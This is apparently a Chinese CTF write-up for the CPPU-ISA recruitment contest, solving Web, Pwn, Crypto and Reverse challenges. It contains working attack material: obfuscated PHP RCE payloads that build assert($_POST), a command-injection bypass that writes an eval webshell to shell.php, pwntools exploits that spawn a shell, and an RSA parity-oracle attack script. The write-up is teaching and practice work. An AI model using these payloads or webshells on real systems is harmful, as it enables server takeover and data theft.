---
title: "CPPU-ISA纳新赛"
date: 2025-12-11 20:51:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "CPPU-ISA"
  - "CPPU"
cnblogs_postid: "19338347"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/19338347"
---

# Web

## EzRce

**简介**
无字母数字RCE，就是在不能输入字母和数字的情况下造成RCE漏洞。

无字母数字RCE的解题思路是将非字母、数字的字符经过各种变换，最后得到任意一个字符或者数字，再拼接成函数，比如assert，然后动态执行。

变换的核心在于两点：
1. 利于逻辑位运算，得到字母或者数字。
2. 利用自增运算得到字母或者数字：在php中，不仅数字可以自增，字母也能自增
```php
<?php 
$a='a'; 
echo $a; // a 
$a++; 
echo $a; // b 
?>
```

**(2) 源码**

```
<?php
highlight_file(__FILE__);
if(!preg_match('/[a-z0-9]/is', $_GET['shell'])) {
    eval($_GET['shell']);
} else {
    die('No!You can\' t do this!!!!');
}
```

`preg_match('/[a-z0-9]/is', $_GET['shell'])` 检查 `$_GET['shell']` 是否包含字母（a-z）或数字（0-9）。

- `i` 表示不区分大小写（A-Z也会被过滤）。
- `s` 表示`.`能匹配换行符（本题无影响）。

`!preg_match(...)` 如果没有检测到字母或数字，就执行 `eval($_GET['shell'])`。  
否则，直接 `die('No!You can\' t do this!!!!')` 终止程序。

由于assert在php5中是一个函数，但在php7不是函数（因此不能拼接调用），所以解题方法分为php5和php7两种情况。

**wp**

A. 异或

在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。

```
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__; //$___='$_POST'
$_($___[_]); // assert($_POST[_]);
?>

// 做题时，将paylaod 写为一行
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);
```

利用：拼接结果是`assert($_POST[_])`，所以用`_`作为参数传递命令即可

```
shell=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);
_=phpinfo();
_=system('cat /flag');
```
![assets/通武廊wp/file-20250828222441090.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052504-1947154732.png)
这里提供两种扩展思路供参考
B. 取反

和异或的思路一致，只是把运算换成取反。这里利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，取反后得到字母。

```
$__=('>'>'<')+('>'>'<');$_=$__/$__;$____='';$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});$_=$$_____;$____($_[$__]);
// 得到assert($_POST[2]); 2=system('whoami')
```

将Payload进urlencode之后，作为参数值传递到服务器，就相当于获得了`assert($_POST[2])`

```
<?php
$__=('>'>'<')+('>'>'<'); // 比较ASCII码，'>' > '<'为true(1)，所以结果是1+1=2
$_=$__/$__; // 2/2 = 1
$____=''; // 初始化空字符串
$___="瞰";
$____.=~($___{$_}); // 取"瞰"的第1个字节并按位取反
$___="和";
$____.=~($___{$__}); // 取"和"的第2个字节并按位取反
$___="和";
$____.=~($___{$__}); // 取"和"的第2个字节并按位取反
$___="的";
$____.=~($___{$_}); // 取"的"的第1个字节并按位取反
$___="半";
$____.=~($___{$_}); // 取"半"的第1个字节并按位取反
$___="始";
$____.=~($___{$__}); // 取"始"的第2个字节并按位取反
// $____ 最终构建成字符串 "assert"

$_____='_';
$___="俯";
$_____.=~($___{$__}); // 构建更多字符
$___="瞰";
$_____.=~($___{$__});
$___="次";
$_____.=~($___{$_});
$___="站";
$_____.=~($___{$_});
// $_____ 最终构建成字符串 "_POST"。
$_=$$_____; // 等价于 $_=$_POST，获取POST数据
$____($_[$__]); // 等价于 assert($_POST[2])
?>
```

取反操作示例：

```
$_ = 1; // 之前计算得出
$____ = ''; // 空字符串
$___ = "瞰"; // 汉字"瞰"
$____.=~($___{$_}); // 取"瞰"的第1个字节并按位取反

1. 在UTF-8编码中，汉字"瞰"占用3个字节：
"瞰" = 0xE7 0x9E 0xB0
http://bea3a46fae2e.target.yijinglab.com/#recipe=To_Hex('Space',0)&input=556w&oenc=65001

2. 字符串索引访问：结果为 0x9E
$___{$_} // 等价于 $___[1] 访问字符串"瞰"的第2个字节（索引从0开始）

3. 按位取反操作
0x9E = 10011110 (二进制)
~0x9E = 01100001 (二进制) = 0x61 (十六进制) = 97 (十进制) = 'a' (ASCII字符)
```

C. 递增

不利用位运算，利用字母可以递增得到下一个字母的特点，也可以通过`++`来获取字母。那么如何获取第一个字母`a`呢？

在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：

```
echo ''.[]; // Array
```

再取这个字符串的第一个字母，就可以获得'A'了（因为PHP函数对大小写不敏感，所以无需获取a）。那么如何取到字符串的第一个字符（0号字符）呢？可以用false表示0，即:

```
echo 'Array'['!'=='a']; // A
```

```
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
// 最后得到ASSERT($_POST[_]);php对大小写不敏感
```

将Payload进urlencode之后，作为参数值传递到服务器，就相当于获得了`ASSERT($_POST[_])`。

```
<?php
$_=[]; // 空数组
$_=@"$_"; // 将数组转换为字符串，结果是 "Array"
$_=$_['!'=='@']; // '!'=='@'为false，转换为0，所以 $_="Array"[0] = "A"
// 现在 $_ = "A" (字符串)

$___=$_; // $___="A"
$__=$_; // $__="A"
// 递增18次
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
// 现在 $__ = "S" (字符串)
$___.=$__; // 现在 $___ = "AS"
$___.=$__; // 现在 $___ = "ASS"

// 递增4次
$__=$_; // $__="A"
$__++;$__++;$__++;$__++; // 现在 $__ = "E" (字符串)
$___.=$__; // 现在 $___ = "ASSE"

// 递增17次
$__=$_; // $__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // 现在 $___ = "ASSER"

// 递增19次
$__=$_; // $__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // 现在 $___ = "ASSERT"

$____='_'; // $____="_"
// 递增15次
$__=$_; // $__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__; // 现在 $____ = "_P"

// 递增14次
$__=$_; // $__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__; // 现在 $____ = "_PO"

// 递增18次
$__=$_; // $__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__; // 现在 $____ = "_POS"

// 递增19次
$__=$_; // $__="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__; // 现在 $____ = "_POST"

$_=$$____; // $_=$_POST
$___($_[_]); // ASSERT($_POST[_])
?>
```
## EzSerialize
增量逃逸：利用序列化与反序列化的属性个数检查差异实现
```php
<?php
function filter($name){
$safe=array("flag","php");
$name=str_replace($safe,"hack",$name);
return $name;
} class test{
var $user;
var $pass='soladdw';
function __construct($user){
	$this->user=$user;
}
} 
$a=str_repeat("php", 29);
$param = $a . '";s:4:"jjkk";s:8:"good_bye";}';
echo $param."\n";
$param=serialize(new test($param));
echo $param."\n";
$profile=unserialize(filter($param));
var_dump($profile->user);
var_dump($profile->pass);
if ($profile->pass=='good_bye'){
echo "ok";
} ?>
```
## 是Alice啊.....
进去要账号密码，没有直接给，所以开始找
使用dirsearch扫描发现log.php，与题目所给的php附件意义接近，考虑这里为注入点
![assets/冀信廊坊分赛区WriteUp/file-20250903212350839.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051977-837540775.png)
这里的rce需要盲打
以下是原有内容（其实只有分号比较难弄）
```
$blacklist = [';', '|', '&', '`', '$(', 'cat', 'curl', 'wget', 'ls', 'whoami', 'rm', 'cp', 'mv'];
```

经过尝试可以使用下列payload（这里主要是进行分号绕过以及echo劫持将一句话木马写到shell.php）
`msg=%0Aecho '<?php if (eval($_POST["cmd"])) {} ?>' > shell.php%0A`
使用蚁剑访问即可获得flag
![assets/通武廊wp/file-20250829094934410.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052580-262821353.png)
# Pwn
## 金丝雀
简单canary
```python
from pwn import *
context.log_level='debug'
p=process('./canary')
magic=0x40128c
#gdb.attach(p)
#pause()
p.recvuntil(b'canary?')
payload=b'%23$p'
p.sendline(payload)
canary=p.recvuntil(b'00')
canary = int(canary[-16:],16)
print("canary->",hex(canary))
payload=b'a'*0x88+p64(canary)+b'a'*8+p64(magic+5)
p.sendline(payload)
p.recvuntil(b'COME!!!')
p.sendline(b'/bin/sh')
p.interactive()
```
## sevedy的奇妙绕过冒险
简单栈溢出
```
from pwn import *
p=process('./test')
#gdb.attach(p)
#pause()
magic=0x40131d
p.recvuntil(b'u: ')
payload=b'a'*0x88+p64(magic+5)
p.sendline(payload)
p.sendline(b'/???/sh')
p.interactive()
```
## Test your NetCat
做了一些过滤和假flag，实际上用$0就可以绕过得到flag
![assets/纳新赛WriteUp/file-20251211202817758.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205050771-405034571.png)
# Crypto

## Do you know lsb?
假设现在有一个oracle(预言机),它会对一个给定的密文进行解密,但并不会直接返回解密结果,而是检验解密的明文的奇偶性,并根据奇偶性返回相应的值,比如1表示奇数,0表示偶数,即最低位( LSB, least significant bit ) .

那么给定任意一个消息被加密后的密文,只需要log(N)次oracle询问,就可以解密出明文消息。(例如当N是1024位时,只需要大约1024次左右的oracle询问,就可以解密出明文。)

Oracle代码

```Python
cc = int(raw_input('Your encrypted message:').strip())
mm = k.decrypt(cc)
if mm & 1 == 1:
        print 'The plain of your decrypted message is odd!'
else:
        print 'The plain of your decrypted message is even!'
```

RSA的积性（乘法同态）： $$Enc(P_1 \cdot P_2) = Enc(P_1) \cdot Enc(P_2)$$证明： $$(P_1 \cdot P_2)^e = P_1^e \cdot P_2^e \pmod{n}$$ 利用这个性质，可以选择一个$s$，并计算$c' \equiv c \cdot s^e \pmod{n}$，将$c'$发送给服务器，服务器会返回$c'$解密结果$m \cdot s$的奇偶性。通过不断巧妙地继续选取$s$，就可以恢复出$m$。

假设我们现在已经获取到了明文$m$加密所得的密文$c$。 第一次选择$s = 2$，并向服务器发送 $$c' \equiv c \cdot 2^e \pmod{n}$$ 服务器解密得到 $$m' \equiv 2 \cdot m \pmod{n}$$ 并会返回$2 \cdot m \pmod{n}$的奇偶性。

由于$m < n$，所以$2 \cdot m \pmod{n}$$有两种情况： - 没有被$\text{mod } n$，就是$2 \cdot m$，此时服务器会返回“偶数”。这说明 $$2 \cdot m < n \text{，即 } 0 \leq m < \frac{n}{2}$$ - 被$\text{mod } n$了，解密结果为$2 \cdot m - n$，由于$2 \cdot m$为偶数且$n$为奇数，因此服务器必然会返回“奇数”。这说明 $$2 \cdot m > n \text{，即 } \frac{n}{2} < m < n$$

!

第二次选择$s=4$，并向服务器发送 $$c' \equiv c \cdot 4^e \pmod{n}$$ 服务器解密得到 $$m' \equiv 4 \cdot m \pmod{n}$$ 并会返回$4 \cdot m \pmod{n}$的奇偶性。

如果$0 \leq m < \frac{n}{2}$： - 服务器返回“偶数”，说明没有被$\text{mod } n$，有$4 \cdot m < n$，也就是说 $$0 \leq m < n/$$

- 服务器返回“奇数”，说明$4 \cdot m > n$，只有 $$ \frac{n}{4} < m < \frac{n}{2} $$
    

如果$\frac{n}{2} \leq m < n$： - 服务器返回“偶数”，说明$4 \cdot m - 2 \cdot n < n$，即 $$0 \leq m < n/$$ - 服务器返回“奇数”，说明$4 \cdot m - 3 \cdot n < n$，即 $$\frac{3n}{4} < m < $$

通过上述方法，可以将$m$的取值范围缩小一半。 之后，仍然可以继续类似的操作，通过选取$s = 2^i$，服务器会返回$m \cdot 2^i$的奇偶性，从而可以不断地将范围缩小一半，直至最后范围缩小到1，即为正确的$m$。

解题exp：

```Python
from pwn import remote
import logging
import re

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 连接服务器 - 请替换为实际的主机地址和端口
host = ''
port = 


def recover_flag():
    try:
        # 创建连接
        r = remote(host, port)

        logging.info("连接服务器成功，等待横幅...")
        banner = r.recvuntil(b'3. Exit\n').decode().strip()
        logging.debug(f"横幅内容: {banner}")

        # 选项1：获取加密的flag和n
        logging.info("发送选项1请求...")
        r.sendline(b'1')

        # 接收响应
        responses = []
        r.recvuntil(b'flag: ')  # 等待菜单提示
        responses.append(r.recvline().decode().strip())  # 第一行响应
        r.recvuntil(b'n:')
        responses.append(r.recvline().decode().strip())  # 第二行响应

        logging.info(f"响应1: {responses[0]}")
        logging.info(f"响应2: {responses[1]}")

        # 使用更健壮的方式提取数字
        encrypted_flag = int(responses[0])
        n = int(responses[1])



        # 检查是否成功提取
        if encrypted_flag is None or n is None:
            raise ValueError("无法从服务器响应中提取加密的flag或n值")

        encrypted_flag = int(encrypted_flag)
        n = int(n)
        logging.info(f"提取成功: 加密的flag = {encrypted_flag}, n = {n}")

        # 初始化攻击参数
        low = 0
        high = n
        e = 65537
        multiplier = pow(2, e, n)  # 2^e mod n

        # 存储当前乘数因子
        current_multiplier = 1

        for i in range(1024):
            # 更新乘数因子
            current_multiplier = (current_multiplier * multiplier) % n

            # 构造查询密文: c * (2^(k*e) mod n)
            query_cipher = (encrypted_flag * current_multiplier) % n

            # 发送选项2
            r.recvuntil(b'> ')  # 等待菜单提示
            r.sendline(b'2')
            r.recvuntil(b':')


            r.recvuntil(b'>')
            # 处理响应
            r.sendline(str(query_cipher).encode())
            resp_line = r.recvline().decode()


            # 确定奇偶性
            if "even" in resp_line:
                parity = 0  # 偶数
            elif "odd" in resp_line:
                parity = 1  # 奇数
            else:
                raise ValueError(f"无法解析服务器响应: {resp_line}")

            # 接收并忽略限制计数
            limit_line = r.recvline().decode().strip()
            logging.debug(f"限制信息: {limit_line}")

            # 每50次打印一次进度
            if (i + 1) % 50 == 0:
                logging.info(f"进度: {i + 1}/1024")

            # 二分区间
            mid = (low + high) // 2
            print(f"服务器响应: {resp_line},现在的mid:{mid}")
            # 如果解密结果为奇数
            if parity == 1:
                low = mid
            else:  # 结果为偶数
                high = mid

        # 最终结果应为区间的中点值
        flag_int = (low + high) // 2

        # 转换为字节
        flag_bytes = flag_int.to_bytes((flag_int.bit_length() + 7) // 8, 'big')

        # 关闭连接
        r.close()

        return flag_bytes

    except Exception as e:
        logging.error(f"攻击过程中出错: {str(e)}", exc_info=True)
        return None


# 执行攻击
if __name__ == "__main__":
    # 设置日志级别为DEBUG以获取更多信息
    # logging.getLogger().setLevel(logging.DEBUG)

    print("开始攻击...")
    flag_bytes = recover_flag()

    if flag_bytes:
        try:
            flag = flag_bytes.decode()
            print(f"\n成功恢复flag: {flag}")
        except UnicodeDecodeError:
            print("\n恢复的字节:")
            print(flag_bytes.hex())
            # 尝试不同的编码
            for encoding in ['utf-8', 'latin-1', 'ascii']:
                try:
                    flag = flag_bytes.decode(encoding)
                    print(f"使用 {encoding} 解码: {flag}")
                    break
                except:
                    continue
    else:
        print("未能恢复flag")
```
图片修复
```python
import cv2  
import numpy as np  
  
  
def arnold_decode(image, alpha, shuffle_times, a, b):  
    """Arnold解密处理"""  
    h, w = image.shape[:2]  
    if h != w:  
        raise ValueError("图像必须是正方形")  
  
    N = h  
    decoded_image = np.zeros_like(image)  
  
    # 计算逆变换矩阵  
    # 原始变换矩阵: [[1, b], [a, a*b+1]]  
    # 逆变换矩阵: [[a*b+1, -b], [-a, 1]]  
    for time in range(shuffle_times):  
        for new_x in range(N):  
            for new_y in range(N):  
                # 应用逆变换公式  
                ori_x = ((a * b + 1) * new_x - b * new_y) % N  
                ori_y = (-a * new_x + 1 * new_y) % N  
                decoded_image[ori_x, ori_y] = image[new_x, new_y]  
  
        image = np.copy(decoded_image)  
  
    # 重新合并alpha通道  
    if alpha is not None:  
        b, g, r = cv2.split(decoded_image)  
        decrypted_img = cv2.merge([b, g, r, alpha])  
    else:  
        decrypted_img = decoded_image  
  
    return decrypted_img  
  
  
def prepare_image(image_path):  
    """加载图像并分离通道"""  
    img = cv2.imread(image_path, cv2.IMREAD_UNCHANGED)  
    if img is None:  
        raise ValueError("图像加载失败")  
  
    # 分离alpha通道（如果有）  
    if img.shape[2] == 4:  
        b, g, r, alpha = cv2.split(img)  
        rgb_img = cv2.merge([b, g, r])  
        return rgb_img, alpha  
    else:  
        return img, None  
  
  
if __name__ == "__main__":  
    encrypted_image = "AI.png"  
    decrypted_image = "decrypted_flag.png"  
  
    # 准备图像（分离RGB和alpha通道）  
    rgb_img, alpha = prepare_image(encrypted_image)  
  
    # 使用与加密相同的参数  
    shuffle_times = 10  
    a_param = 5  
    b_param = 2  
  
    # 解密图像  
    decrypted_img = arnold_decode(rgb_img, alpha, shuffle_times, a_param, b_param)  
  
    # 保存解密后的图像  
    cv2.imwrite(decrypted_image, decrypted_img, [cv2.IMWRITE_PNG_COMPRESSION, 0])  
    print(f"图像已成功解密并保存至: {decrypted_image}")
```
## 图片修复
```python
import cv2  
import numpy as np  
  
  
def arnold_decode(image, alpha, shuffle_times, a, b):  
    """Arnold解密处理"""  
    h, w = image.shape[:2]  
    if h != w:  
        raise ValueError("图像必须是正方形")  
  
    N = h  
    decoded_image = np.zeros_like(image)  
  
    # 计算逆变换矩阵  
    # 原始变换矩阵: [[1, b], [a, a*b+1]]  
    # 逆变换矩阵: [[a*b+1, -b], [-a, 1]]  
    for time in range(shuffle_times):  
        for new_x in range(N):  
            for new_y in range(N):  
                # 应用逆变换公式  
                ori_x = ((a * b + 1) * new_x - b * new_y) % N  
                ori_y = (-a * new_x + 1 * new_y) % N  
                decoded_image[ori_x, ori_y] = image[new_x, new_y]  
  
        image = np.copy(decoded_image)  
  
    # 重新合并alpha通道  
    if alpha is not None:  
        b, g, r = cv2.split(decoded_image)  
        decrypted_img = cv2.merge([b, g, r, alpha])  
    else:  
        decrypted_img = decoded_image  
  
    return decrypted_img  
  
  
def prepare_image(image_path):  
    """加载图像并分离通道"""  
    img = cv2.imread(image_path, cv2.IMREAD_UNCHANGED)  
    if img is None:  
        raise ValueError("图像加载失败")  
  
    # 分离alpha通道（如果有）  
    if img.shape[2] == 4:  
        b, g, r, alpha = cv2.split(img)  
        rgb_img = cv2.merge([b, g, r])  
        return rgb_img, alpha  
    else:  
        return img, None  
  
  
if __name__ == "__main__":  
    encrypted_image = "AI.png"  
    decrypted_image = "decrypted_flag.png"  
  
    # 准备图像（分离RGB和alpha通道）  
    rgb_img, alpha = prepare_image(encrypted_image)  
  
    # 使用与加密相同的参数  
    shuffle_times = 10  
    a_param = 5  
    b_param = 2  
  
    # 解密图像  
    decrypted_img = arnold_decode(rgb_img, alpha, shuffle_times, a_param, b_param)  
  
    # 保存解密后的图像  
    cv2.imwrite(decrypted_image, decrypted_img, [cv2.IMWRITE_PNG_COMPRESSION, 0])  
    print(f"图像已成功解密并保存至: {decrypted_image}")
```
## Sign_in
题解：

按题目意思，去除所有0
```
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```
AAencode解密：
lrgm{Ea_Rogtm_Cko_0!!!}

凯撒密码：
flag{Yu_Liang_Wei_0!!!}
# Reverse
## signin
die查壳
![assets/通武廊wp/file-20250829135746084.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205050885-1088269042.png)
ida打开，提示是迷宫
![assets/通武廊wp/file-20250829135815363.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051997-1952334614.png)
结合while循环和mi数组推出迷宫如下
```
s******+++
++++++*+++
++++++*+++
+++****+++
+++*++++++
+++*+++***
+++*****+*
+++++++++*
+++++++++*
+++++++++e
```
flag是ddddddsssaaasssddddwddssss
## 旋转的茂密
die查壳，发现是upx
![assets/通武廊wp/file-20250829135914530.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051444-960361952.png)
工具脱壳失败，被魔改了
![assets/通武廊wp/file-20250829141016309.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052274-1998681922.png)
010打开发现标志位被更改了，改正后脱壳成功
![assets/通武廊wp/file-20250829141030362.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051552-301720731.png)
![assets/通武廊wp/file-20250829141036627.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052217-1558914821.png)
ida打开
![assets/通武廊wp/file-20250829141046893.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052151-419867102.png)
cmp函数中有字符串p11r1p11r1
![assets/通武廊wp/file-20250829141104227.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052610-2098480378.png)
再根据main函数中代码可得flag为o11a1o11a1
## rrrcc4
die查壳
![assets/通武廊wp/file-20250829141325137.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051674-1765902851.png)
ida打开
![assets/通武廊wp/file-20250829141339737.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205053262-1285298607.png)
发现是标准rc4加密，s盒初始化和加密部分没有魔改
![assets/通武廊wp/file-20250829141349411.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205055897-123820528.png)
![assets/通武廊wp/file-20250829141356793.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052640-174593536.png)
在最后有一个异或，得到的结果不是标准的rc4加密结果
![assets/通武廊wp/file-20250829141407948.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052704-1264052434.png)
